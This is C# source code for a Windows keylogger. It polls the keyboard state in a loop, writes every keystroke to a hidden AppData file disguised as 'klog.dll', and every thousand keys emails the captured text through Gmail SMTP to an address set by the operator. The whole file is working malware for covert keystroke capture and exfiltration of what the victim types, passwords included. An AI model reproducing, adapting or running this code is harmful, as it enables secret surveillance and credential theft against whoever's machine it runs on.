using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Net;
using System.Net.Mail;

namespace klog
{
    class Program
    {
        [DllImport("User32.dll")]

        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {

            string You = (Environment.UserName);
            String root = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            // Path : C:\Users\You\AppData\Roaming

            string r = (root + @"\klog.dll");

            if (!File.Exists(r))
            {
                using (StreamWriter sw = File.CreateText(r))
                {}
            }

            KeysConverter conv = new KeysConverter();
            string t = "";

            // Hides the file
            File.SetAttributes(r, File.GetAttributes(r) | FileAttributes.Hidden);

            int num = 0;

            while (true)
            {
                Thread.Sleep(10);

                for (int i = 32; i < 300; i++)
                {
                    int k = GetAsyncKeyState(i);
                    if (k == 32769)
                    {
                        t = conv.ConvertToString(i);
                        using (StreamWriter sw = File.AppendText(r))
                        {
                            sw.Write(t + " ");
                        }

                        num++;

                        if (num % 1000 == 0)
                        {
                            SendEmail();
                        }
                    }
                }
            }
        }

        public static void SendEmail()
        {
            try
            {
                // Sends an email when 1000 characters have been pressed.

                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
                mail.From = new MailAddress("your_email@gmail.com");
                mail.To.Add("to_mail@gmail.com");
                mail.Subject = "Email from klog";

                String root = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string r = (root + @"\klog.dll");

                String c = File.ReadAllText(r);

                mail.Body = c;

                // Since this file is in use, sending it as an attachment doesn't work
                // System.Net.Mail.Attachment attachment;
                // attachment = new System.Net.Mail.Attachment(r);
                // mail.Attachments.Add(attachment);

                SmtpServer.Port = 587;
                // Get your password: https://myaccount.google.com/apppasswords
                // If you get an, not authenticated error
                SmtpServer.Credentials = new System.Net.NetworkCredential("your_email@gmail.com", "your_password");
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);
            }
            catch (Exception e)
            {
                Console.Write("Error when sending an email : " + e);
            }
        }
    }
}
